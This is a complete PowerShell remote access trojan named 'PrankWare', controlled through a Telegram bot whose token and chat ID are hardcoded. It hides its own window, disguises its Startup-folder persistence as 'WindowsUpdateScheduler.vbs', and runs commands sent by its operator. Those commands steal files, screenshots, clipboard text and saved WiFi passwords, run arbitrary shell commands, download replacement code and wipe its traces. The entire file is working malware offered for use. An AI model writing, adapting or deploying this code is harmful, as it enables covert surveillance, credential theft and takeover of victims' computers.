Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

if (-not $env:PS_RUN_HIDDEN -or $env:PS_RUN_HIDDEN -ne "1") {
    $env:PS_RUN_HIDDEN = "1"

    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {
        $scriptPath = "$PSScriptRoot\$($MyInvocation.InvocationName)"
    }

    if (-not (Test-Path $scriptPath)) {
        $scriptPath = "$env:TEMP\__temp_$(Get-Random).ps1"
        [System.IO.File]::WriteAllText($scriptPath, $MyInvocation.Line)
    }

    $vbsPath = "$env:TEMP\__launcher_$(Get-Random).vbs"
    $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$scriptPath"" -PS_RUN_HIDDEN 1", 0, False
"@
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
    
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    
    Start-Sleep -Seconds 2
    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
    
    exit
}

param(
    [string]$PS_RUN_HIDDEN = ""
)

if ($PS_RUN_HIDDEN -eq "1") {
    $env:PS_RUN_HIDDEN = "1"
}

if ($env:PS_RUN_HIDDEN -ne "1") {
    exit
}

# --- ALL FUNCTION DEFINITIONS START HERE ---

function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$message
    )
    Invoke-RestMethod "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{
        chat_id = $chatId
        text = $message
    } | ConvertTo-Json -Depth 10)
}

function Get-PCName {
    return $env:COMPUTERNAME
}

function Send-TelegramFile {
    param (
        [string]$chatId,
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        return "File not found: $filePath"
    }

    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)

        $content = (
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n" +
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
            "Content-Type: application/octet-stream`r`n`r`n"
        )

        $footer = "`r`n--$boundary--`r`n"

        $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

        $bodyBytes = New-Object byte[] ($contentBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($contentBytes, 0, $bodyBytes, 0, $contentBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $bodyBytes, $contentBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $contentBytes.Length + $fileBytes.Length, $footerBytes.Length)

        Invoke-RestMethod -Uri "$apiUrl/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
        return "File sent: $filePath"
    } catch {
        return "Error sending file: $_"
    }
}

function Get-LocalIP {
    $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
    return $ipInfo.IPAddress -join ' '
}

function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
        return $publicIP.ip
    } catch {
        return "Unable to retrieve public IP."
    }
}

function Send-Screenshot {
    param (
        [string]$chatId
    )
    try {
        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"

        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)

        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()

        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
        $fileContentBase64 = [Convert]::ToBase64String($fileContent)

        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"$LF",
            "$chatId",
            "--$boundary",
            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
            "Content-Type: image/png$LF",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
            "--$boundary--$LF"
        ) -join $LF

        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines

        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
        return $true
    }
    catch {
        return $false
    }
}

function Send-TelegramFolder {
    param (
        [string]$chatId,
        [string]$folderPath
    )

    if (-not (Test-Path $folderPath -PathType Container)) {
        return "Folder not found: $folderPath"
    }

    try {
        $zipPath = "$env:TEMP\$(Split-Path $folderPath -Leaf)_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
        Compress-Archive -Path $folderPath -DestinationPath $zipPath -Force
        $result = Send-TelegramFile -chatId $chatId -filePath $zipPath
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        return $result
    } catch {
        return "Error zipping/sending folder: $_"
    }
}

function Get-ClipboardContent {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        if ([string]::IsNullOrEmpty($clipboardText)) {
            return "Clipboard is empty or contains non-text content."
        }
        return $clipboardText
    } catch {
        return "Error reading clipboard: $_"
    }
}

function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cs = Get-CimInstance Win32_ComputerSystem
        $proc = Get-CimInstance Win32_Processor
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
        
        $info = @"
System Information:
------------------
Computer Name: $($cs.Name)
OS: $($os.Caption) $($os.OSArchitecture)
Version: $($os.Version)
Manufacturer: $($cs.Manufacturer)
Model: $($cs.Model)
Processor: $($proc.Name)
RAM: $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2)) GB
C: Drive: $([math]::Round($disk.Size / 1GB, 2)) GB total, $([math]::Round($disk.FreeSpace / 1GB, 2)) GB free
"@
        return $info
    } catch {
        return "Error retrieving system information: $_"
    }
}

function Get-WifiPasswords {
    try {
        $originalLocation = Get-Location
        Push-Location "C:\Windows\System32"  # or just "C:\"
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        Pop-Location

        if (-not $profiles) {
            return "No WiFi profiles found."
        }

        $results = "Saved WiFi Networks and Passwords:`n----------------------------------`n"

        foreach ($profile in $profiles) {
            Push-Location "C:\Windows\System32"
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
            Pop-Location

            if ($password) {
                $pass = $password.ToString().Split(":")[1].Trim()
                $results += "Network: $profile`nPassword: $pass`n`n"
            } else {
                $results += "Network: $profile`nPassword: [No Password Found]`n`n"
            }
        }

        return $results
    } catch {
        return "Error retrieving WiFi passwords: $_"
    }
}

function Set-ClipboardContent {
    param (
        [string]$text
    )
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::SetText($text)
        return $true
    } catch {
        return $false
    }
}

function Invoke-SelfDestruct {
    param (
        [string]$chatId
    )
    
    try {
        $scriptName = [System.IO.Path]::GetFileName($MyInvocation.MyCommand.Path)
        $startupFolder = [System.Environment]::GetFolderPath('Startup')
        $vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"
        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
        
        Send-TelegramMessage -chatId $chatId -message "Self-destruct initiated. Removing persistence..."
        
        if (Test-Path $vbsLauncherPath) {
            Remove-Item $vbsLauncherPath -Force -ErrorAction SilentlyContinue
            Send-TelegramMessage -chatId $chatId -message "Removed startup launcher."
        }
        
        if (Test-Path $hiddenScriptPath) {
            Remove-Item $hiddenScriptPath -Force -ErrorAction SilentlyContinue
            Send-TelegramMessage -chatId $chatId -message "Removed hidden script copy."
        }
        
        $cleanupScript = @"
Start-Sleep -Seconds 3
Remove-Item -Path "$($MyInvocation.MyCommand.Path)" -Force
"@
        
        $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
        [System.IO.File]::WriteAllText($cleanupPath, $cleanupScript)
        
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$cleanupPath`"" -WindowStyle Hidden
        
        Send-TelegramMessage -chatId $chatId -message "Self-destruct complete. Script will terminate now."
        
        exit
    }
    catch {
        Send-TelegramMessage -chatId $chatId -message "Error during self-destruct: $_"
    }
}

function Send-TgMessage($ChatId, $Text) {
    $payload = @{
        chat_id = $ChatId
        text    = $Text.Substring(0, [Math]::Min(4000, $Text.Length)) 
    }
    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json -Depth 3 -Compress)
}

function Run-LocalCommand($Command, $ShellType) {
    try {
        if ($ShellType -eq "powershell") {
            $Output = powershell -NoProfile -Command $Command 2>&1 | Out-String
        }
        else {
            $Output = cmd.exe /c $Command 2>&1 | Out-String
        }
    }
    catch {
        $Output = $_.Exception.Message
    }
    return $Output
}

# New file operation functions
function Remove-FileOrFolder {
    param (
        [string]$chatId,
        [string]$path
    )
    
    try {
        if (-not [System.IO.Path]::IsPathRooted($path)) {
            $path = Join-Path $global:CurrentDirectory $path
        }
        
        if (Test-Path $path) {
            if (Test-Path $path -PathType Container) {
                Remove-Item -Path $path -Recurse -Force
                return "Folder deleted: $path"
            } else {
                Remove-Item -Path $path -Force
                return "File deleted: $path"
            }
        } else {
            return "Path not found: $path"
        }
    } catch {
        return "Error deleting $path`: $_"
    }
}

function Rename-FileOrFolder {
    param (
        [string]$chatId,
        [string]$oldPath,
        [string]$newPath
    )
    
    try {
        if (-not [System.IO.Path]::IsPathRooted($oldPath)) {
            $oldPath = Join-Path $global:CurrentDirectory $oldPath
        }
        
        if (-not [System.IO.Path]::IsPathRooted($newPath)) {
            $newPath = Join-Path $global:CurrentDirectory $newPath
        }
        
        if (Test-Path $oldPath) {
            Move-Item -Path $oldPath -Destination $newPath -Force
            return "Renamed/Moved: $oldPath → $newPath"
        } else {
            return "Source path not found: $oldPath"
        }
    } catch {
        return "Error renaming/moving: $_"
    }
}





function Get-RunningProcesses {
    try {
        $processes = Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, StartTime | Sort-Object CPU -Descending | Select-Object -First 20
        
        $result = "Top 20 Running Processes:`n"
        $result += "ID    | Process Name          | CPU Time    | Memory (MB) | Start Time`n"
        $result += "------|----------------------|-------------|-------------|-----------`n"
        
        foreach ($proc in $processes) {
            $memoryMB = [math]::Round($proc.WorkingSet / 1MB, 2)
            $startTime = if ($proc.StartTime) { $proc.StartTime.ToString("HH:mm:ss") } else { "N/A" }
            $result += "{0,-5} | {1,-20} | {2,-11} | {3,-11} | {4}`n" -f $proc.Id, $proc.ProcessName, $proc.CPU, $memoryMB, $startTime
        }
        
        return $result
    } catch {
        return "Error retrieving process list: $_"
    }
}

function Kill-ProcessById {
    param (
        [string]$chatId,
        [int]$processId
    )
    
    try {
        $process = Get-Process -Id $processId -ErrorAction Stop
        $processName = $process.ProcessName
        Stop-Process -Id $processId -Force
        return "Process killed: $processName (PID: $processId)"
    } catch {
        return "Error killing process with PID $processId`: $_"
    }
}

function Get-WindowsServices {
    try {
        $services = Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, Status, StartType | Sort-Object Name | Select-Object -First 30
        
        $result = "Running Windows Services (Top 30):`n"
        $result += "Service Name        | Display Name                    | Status  | Start Type`n"
        $result += "-------------------|--------------------------------|---------|-----------`n"
        
        foreach ($service in $services) {
            $result += "{0,-18} | {1,-30} | {2,-7} | {3}`n" -f $service.Name, $service.DisplayName.Substring(0, [Math]::Min(30, $service.DisplayName.Length)), $service.Status, $service.StartType
        }
        
        return $result
    } catch {
        return "Error retrieving services: $_"
    }
}

function Get-TaskList {
    try {
        $processes = Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, StartTime | Sort-Object WorkingSet -Descending | Select-Object -First 25
        
        $result = "Task List (Top 25 by Memory Usage):`n"
        $result += "Image Name         | PID    | Mem Usage | Status | CPU Time | Window Title`n"
        $result += "-------------------|--------|-----------|--------|----------|-------------`n"
        
        foreach ($proc in $processes) {
            $memoryMB = [math]::Round($proc.WorkingSet / 1MB, 2)
            $cpuTime = if ($proc.CPU) { $proc.CPU.ToString("F2") } else { "0.00" }
            $result += "{0,-18} | {1,-6} | {2,-9} | {3,-6} | {4,-8} | {5}`n" -f $proc.ProcessName, $proc.Id, "$memoryMB MB", "Running", $cpuTime, "N/A"
        }
        
        return $result
    } catch {
        return "Error retrieving task list: $_"
    }
}

function Kill-ProcessByName {
    param (
        [string]$chatId,
        [string]$processName
    )
    
    try {
        $processes = Get-Process -Name $processName -ErrorAction Stop
        
        if ($processes.Count -eq 0) {
            return "No processes found with name: $processName"
        }
        
        $processes | Stop-Process -Force
        return "Killed $($processes.Count) process(es) with name: $processName"
    } catch {
        return "Error killing processes with name '$processName`: $_"
    }
}

function Update-Script {
    param (
        [string]$chatId,
        [string]$updateUrl
    )
    
    try {
        Send-TelegramMessage -chatId $chatId -message "Starting update from: $updateUrl"
        
        # Download new script directly to appdata location, overwriting the old one
        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\prankware.ps1"
        Invoke-WebRequest -Uri $updateUrl -OutFile $hiddenScriptPath
        
        Send-TelegramMessage -chatId $chatId -message "Update complete. Restarting system now..."
        
        # Restart system immediately using shutdown command
        shutdown /r /t 0
        
    } catch {
        Send-TelegramMessage -chatId $chatId -message "Update failed: $_"
    }
}

function Send-HelpMessage {
    param ([string]$chatId)
    $helpMessage = @"
================= AVAILABLE COMMANDS =================

FILE OPERATIONS
------------------------------------------------------
/delete <path>         Delete a file or folder
/rename <old> <new>    Rename or move a file or folder
/getfile <path>        Send a file from local disk
/getfolder <path>      Send a zipped folder from local disk

MONITORING & CONTROL
------------------------------------------------------
/processes             List running processes
/kill <pid>            Terminate a process by PID
/services              List Windows services and their status
/tasklist              Same as tasklist command
/taskkill <name>       Kill processes by name

SYSTEM CONTROL
------------------------------------------------------
/help                  Displays this help message
/notepad               Opens Notepad
/visit <url>           Opens a URL in the browser
/lock                  Locks workstation
/restart               Restarts the computer
/shutdown              Shuts down the computer
/ip                    Shows local and public IP
/screenshot            Sends a screenshot
/pcname                Shows the computer name
/getclipboard          Gets text from clipboard
/setclipboard <text>   Sets text to clipboard
/sysinfo               Displays detailed system information
/wifi                  Shows all saved WiFi networks and passwords
/selfdestruct          Removes all traces of the script and terminates

FILE SYSTEM
------------------------------------------------------
cd <path>              Change directory
cd                     Show current directory
ls or dir              List files and folders

COMMAND EXECUTION
------------------------------------------------------
/cmd <command>         Execute CMD command
/powershell <command>  Execute PowerShell command
/update <url>           Updates the script from a URL and restarts

======================================================
"@
    Send-TelegramMessage -chatId $chatId -message $helpMessage
}

# --- ALL FUNCTION DEFINITIONS END HERE ---

# --- CONNECTIVITY & RESUME HANDLERS START ---
function Test-NetworkOnline {
    param (
        [int]$timeoutMs = 3000
    )
    try {
        if (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable()) { return $false }

        $ping = New-Object System.Net.NetworkInformation.Ping
        $reply = $ping.Send("8.8.8.8", $timeoutMs)
        if ($reply.Status -ne [System.Net.NetworkInformation.IPStatus]::Success) { return $false }

        $request = [System.Net.HttpWebRequest]::Create("$apiUrl/getMe")
        $request.Method = "GET"
        $request.Timeout = $timeoutMs
        $request.ReadWriteTimeout = $timeoutMs
        $request.AllowAutoRedirect = $false
        $response = $request.GetResponse()
        $response.Close()
        return $true
    } catch { return $false }
}

function Wait-ForNetwork {
    param (
        [int]$maxBackoffSec = 60
    )
    $backoff = 2
    while (-not (Test-NetworkOnline)) {
        try { Write-Host "PrankWare: Waiting for network... retry in $backoff sec" } catch {}
        Start-Sleep -Seconds $backoff
        $backoff = [Math]::Min($backoff * 2, $maxBackoffSec)
    }
}
# --- CONNECTIVITY & RESUME HANDLERS END ---

# --- ONLINE/OFFLINE NOTIFIER START ---
function Start-NetworkMonitor {
    try {
        $global:IsOnline = Test-NetworkOnline
        $global:OfflineAnnounced = $false

        $timer = New-Object System.Timers.Timer
        $timer.Interval = 10000
        $timer.AutoReset = $true

        Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
            try {
                $nowOnline = Test-NetworkOnline

                if ($nowOnline -and -not $global:IsOnline) {
                    $global:IsOnline = $true
                    $global:OfflineAnnounced = $false
                    try { Send-TelegramMessage -chatId $userId -message "PC is back online: $(Get-PCName)" } catch {}
                }
				elseif (-not $nowOnline -and $global:IsOnline) {
					$global:IsOnline = $false
					if (-not $global:OfflineAnnounced) {
						$global:OfflineAnnounced = $true
						# Offline notification removed
					}
				}
            } catch {}
        } | Out-Null

        $timer.Start()
    } catch {}
}
# --- ONLINE/OFFLINE NOTIFIER END ---

$botToken = "7247630595:AAE0Rtt4pfBsAHeSM8oPlc6SBT0-TuevaPM"
$userId = "6218146252"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastUpdateId = 0 # Initial default


try {
    # Ensure modern TLS
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}

    # Track resume-from-sleep events
    $global:JustResumed = $false
    try {
        Add-Type -AssemblyName System.Windows.Forms | Out-Null
        Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName PowerModeChanged -Action {
            if ($EventArgs.Mode -eq [Microsoft.Win32.PowerModes]::Resume) { $global:JustResumed = $true }
        } | Out-Null
    } catch {}

    Wait-ForNetwork
    Write-Host "PrankWare: Checking for pending Telegram commands on startup..."
    $pendingUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=100&timeout=10" 
    
    if ($pendingUpdates.ok -and $pendingUpdates.result.Count -gt 0) {
        $highestUpdateId = ($pendingUpdates.result | Sort-Object update_id -Descending | Select-Object -First 1).update_id
        
        if ($highestUpdateId -gt $lastUpdateId) {
            $lastUpdateId = $highestUpdateId
            $startupMessage = "PrankWare: Advanced update offset to $($lastUpdateId + 1) to skip $($pendingUpdates.result.Count) old/pending command(s)."
            Write-Host $startupMessage
        } else {
            Write-Host "PrankWare: No new pending commands to skip. Current offset is appropriate."
        }
    } elseif ($pendingUpdates.ok) {
        Write-Host "PrankWare: No pending commands found on startup."
    } else {
        $startupError = "PrankWare: Could not check for pending commands. API Error: $($pendingUpdates.description | Out-String)"
        Write-Host $startupError
    }
} catch {
    $exceptionMessage = $_.Exception.Message | Out-String
    $startupCatchError = "PrankWare: Error during startup check for pending commands: $exceptionMessage. Starting with default offset."
    Write-Host $startupCatchError
}

Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"

# Start monitoring network state transitions
Start-NetworkMonitor

$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$destinationPath = Join-Path $startupFolder $scriptName

$vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"

$hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
Copy-Item -Path $scriptPath -Destination $hiddenScriptPath -Force

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$hiddenScriptPath"" -PS_RUN_HIDDEN 1", 0, False
"@
[System.IO.File]::WriteAllText($vbsLauncherPath, $vbsContent)


$global:CurrentDirectory = (Get-Location).Path

while ($true) {
    try {
        if ($global:JustResumed) {
            $global:JustResumed = $false
            try {
                Wait-ForNetwork
                $resumeUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=1&timeout=1"
                if ($resumeUpdates.ok -and $resumeUpdates.result.Count -gt 0) {
                    $lastUpdateId = ($resumeUpdates.result | Sort-Object update_id -Descending | Select-Object -First 1).update_id
                }
                Send-TelegramMessage -chatId $userId -message "System resumed from sleep. Reconnected on PC: $(Get-PCName)"
            } catch {}
        }

        Wait-ForNetwork
        $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $chatId = $update.message.chat.id
            $text = $update.message.text.Trim()

            if ($chatId -ne $userId) { continue }



            # Ensure CurrentDirectory is always initialized at the start of the loop
            if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
                $global:CurrentDirectory = (Get-Location).Path
            }

            if ($text -match "^cd\s+(.+)$") {
                $targetPath = $matches[1].Trim('"').Trim()
                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
                }
                try {
                    if ($targetPath -like "\\*") {
                        Push-Location $targetPath
                        Pop-Location
                        $global:CurrentDirectory = $targetPath
                        $reply = "Changed directory to UNC/network path: $targetPath"
                    }
                    elseif (Test-Path $targetPath -PathType Container) {
                        Set-Location $targetPath
                        $global:CurrentDirectory = (Resolve-Path $targetPath).Path
                        $reply = "Changed directory to: $global:CurrentDirectory"
                    }
                    else {
                        $reply = "Directory not found: $targetPath"
                    }
                } catch {
                    $reply = "Failed to access directory: $_"
                }
            }
            elseif ($text -match "^cd$") {
                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "") {
                    $global:CurrentDirectory = (Get-Location).Path
                }
                $reply = "Current directory: $global:CurrentDirectory"
            }
            elseif ($text -match "^(ls|dir)$") {
                # Ensure we have a valid current directory
                if (-not $global:CurrentDirectory -or $global:CurrentDirectory -eq "" -or -not (Test-Path $global:CurrentDirectory)) {
                    $global:CurrentDirectory = (Get-Location).Path
                }
                
                try {
                    # Check if directory exists and is accessible
                    if (-not (Test-Path $global:CurrentDirectory -PathType Container)) {
                        $reply = "Directory '$global:CurrentDirectory' does not exist or is not accessible."
                    } else {
                        # Use ErrorAction Stop to catch all errors
                        $items = @(Get-ChildItem -Path $global:CurrentDirectory -Force -ErrorAction Stop)
                        
                        if ($items.Count -gt 0) {
                            $list = foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "[Folder]" } else { "[File]  " }
                                $size = if (-not $item.PSIsContainer) { 
                                    " ({0:N0} bytes)" -f $item.Length 
                                } else { 
                                    "" 
                                }
                                "$type $($item.Name)$size"
                            }
                            $reply = "Files and folders in '$global:CurrentDirectory' ($($items.Count) items):`n" + ($list -join "`n")
                        } else {
                            $reply = "Directory '$global:CurrentDirectory' is empty."
                        }
                    }
                } catch [System.UnauthorizedAccessException] {
                    $reply = "Access denied to directory '$global:CurrentDirectory'. You may need elevated permissions."
                } catch [System.IO.DirectoryNotFoundException] {
                    $reply = "Directory '$global:CurrentDirectory' was not found."
                    # Reset to current location
                    $global:CurrentDirectory = (Get-Location).Path
                } catch {
                    $reply = "Error reading directory '$global:CurrentDirectory': $($_.Exception.Message)"
                    Write-Host "Debug: Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Yellow
                    Write-Host "Debug: Full error: $_" -ForegroundColor Yellow
                }
            }
            elseif ($text -eq "/help") {
                Send-HelpMessage -chatId $chatId
                continue
            }
            elseif ($text -eq "/ip") {
                $localIP = Get-LocalIP
                $publicIP = Get-PublicIP
                $reply = "Local IP: $localIP`nPublic IP: $publicIP"
            }
            elseif ($text -eq "/pcname") {
                $pcName = Get-PCName
                $reply = "Computer Name: $pcName"
            }
            elseif ($text -eq "/notepad") {
                Start-Process notepad.exe
                $reply = "Notepad opened."
            }
            elseif ($text -match "^/visit\s+(http[s]?:\/\/.*)") {
                $url = $matches[1]
                [System.Diagnostics.Process]::Start($url)
                $reply = "Opened in browser: $url"
            }
            elseif ($text -eq "/lock") {
                rundll32.exe user32.dll,LockWorkStation
                $reply = "System locked."
            }
            elseif ($text -eq "/restart") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to restart the system? Send '/confirm-restart' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-restart") {
                shutdown /r /t 0
                $reply = "Restarting system..."
            }
            elseif ($text -eq "/shutdown") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to shut down the system? Send '/confirm-shutdown' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-shutdown") {
                shutdown /s /t 0
                $reply = "Shutting down system..."
            }
            elseif ($text -eq "/screenshot") {
                $reply = "Taking screenshot..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $success = Send-Screenshot -chatId $chatId
                $reply = if ($success) { "Screenshot sent." } else { "Failed to capture screenshot." }
            }
            elseif ($text -match "^/getfile\s+(.+)$") {
                $filePath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($filePath)) {
                    $filePath = Join-Path $global:CurrentDirectory $filePath
                }
                $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
            }
            elseif ($text -match "^/getfolder\s+(.+)$") {
                $folderPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($folderPath)) {
                    $folderPath = Join-Path $global:CurrentDirectory $folderPath
                }
                $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
            }
            elseif ($text -eq "/getclipboard") {
                $clipboardContent = Get-ClipboardContent
                $reply = "Clipboard content:`n$clipboardContent"
            }
            elseif ($text -match "^/setclipboard\s+(.+)$") {
                $clipText = $matches[1]
                $success = Set-ClipboardContent -text $clipText
                $reply = if ($success) { "Text set to clipboard: $clipText" } else { "Failed to set clipboard text." }
            }
            elseif ($text -eq "/sysinfo") {
                $sysInfo = Get-SystemInfo
                $reply = $sysInfo
            }
            elseif ($text -eq "/wifi") {
                $wifiPasswords = Get-WifiPasswords
                $reply = $wifiPasswords
            }

            elseif ($text -eq "/selfdestruct") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to remove all traces of this script? Send '/confirm-selfdestruct' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-selfdestruct") {
                Invoke-SelfDestruct -chatId $chatId
                continue
            }
            # New file operation commands
            elseif ($text -match "^/delete\s+(.+)$") {
                $path = $matches[1].Trim('"')
                $reply = Remove-FileOrFolder -chatId $chatId -path $path
            }
            elseif ($text -match "^/rename\s+(.+?)\s+(.+)$") {
                $oldPath = $matches[1].Trim('"')
                $newPath = $matches[2].Trim('"')
                $reply = Rename-FileOrFolder -chatId $chatId -oldPath $oldPath -newPath $newPath
            }
            elseif ($text -eq "/processes") {
                $reply = Get-RunningProcesses
            }
            elseif ($text -match "^/kill\s+(\d+)$") {
                $processId = [int]$matches[1]
                $reply = Kill-ProcessById -chatId $chatId -processId $processId
            }
            elseif ($text -eq "/services") {
                $reply = Get-WindowsServices
            }
            elseif ($text -eq "/tasklist") {
                $reply = Get-TaskList
            }
            elseif ($text -match "^/taskkill\s+(.+)$") {
                $processName = $matches[1].Trim()
                $reply = Kill-ProcessByName -chatId $chatId -processName $processName
            }
			elseif ($text -like "/cmd*") {
                $Command = $text -replace "^/cmd\s*", ""
                $Result  = Run-LocalCommand $Command "cmd"
                Send-TgMessage $chatId "CMD> $Command`n`n$Result"
                continue
            }
            elseif ($text -like "/powershell*") {
                $Command = $text -replace "^/powershell\s*", ""
                $Result  = Run-LocalCommand $Command "powershell"
                Send-TgMessage $chatId "PS> $Command`n`n$Result"
                continue
            }
            elseif ($text -match "^/update\s+(.+)$") {
                $updateUrl = $matches[1].Trim()
                Update-Script -chatId $chatId -updateUrl $updateUrl
                continue
            }
			else {
				$reply = "Unknown command."
				Send-TelegramMessage -chatId $chatId -message $reply
			}
            Send-TelegramMessage -chatId $chatId -message $reply
        }
        Start-Sleep -Seconds 2
    } catch {
        try { Write-Host "PrankWare: Poll error: $($_.Exception.Message). Waiting for network..." } catch {}
        Wait-ForNetwork
        Start-Sleep -Seconds 2
    }
}
